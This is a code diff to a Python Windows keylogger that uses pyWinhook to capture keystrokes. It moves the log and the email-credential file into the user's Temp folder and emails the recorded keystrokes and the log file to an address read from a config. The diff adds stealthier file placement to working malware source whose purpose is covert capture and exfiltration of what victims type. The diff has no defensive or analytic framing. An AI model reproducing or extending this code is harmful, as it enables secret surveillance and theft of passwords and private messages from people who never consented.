@@ -1,18 +1,23 @@
+import configparser
+import os
 import time
+from getpass import getuser
 from threading import Thread
 
 import pythoncom
 import pyWinhook as pyHook
+
 from utils import send_mail
-import configparser 
-import os
 
 
 class KeyLogger:
 
+    USER_NAME = getuser()
+    APP_DIR = f'C:/Users/{USER_NAME}/AppData/Local/Temp'
+
     def __init__(self,log_method=1,log_file='keylog.txt',debug=False,time_interval=1):
         self.key_strokes = ""
-        self.log_file = log_file
+        self.log_file = os.path.join(KeyLogger.APP_DIR,log_file)
         if os.path.exists(self.log_file):
             os.remove(self.log_file)
         self.timer = Thread(target=self.schedule_log,args=())
@@ -97,7 +102,7 @@ class KeyLogger:
         print("Sending email logs...")
         self.log_to_file()
         if login_cred is None:
-            if os.path.exists('email.cfg'):
+            if os.path.exists(os.path.join(KeyLogger.APP_DIR,'email.cfg')):
                 config = configparser.ConfigParser()
                 config.read('email.cfg')
                 email = config['LOGIN_CRED']['EMAIL']
@@ -105,6 +110,7 @@ class KeyLogger:
         else:
             email, password = login_cred
         send_mail(email,email,time.strftime('Keylogs for %c'),self.key_strokes,files=[self.log_file],creds=(email,password))
+        print('Email sent!')
         os.remove(self.log_file)
 
 if __name__ == "__main__":
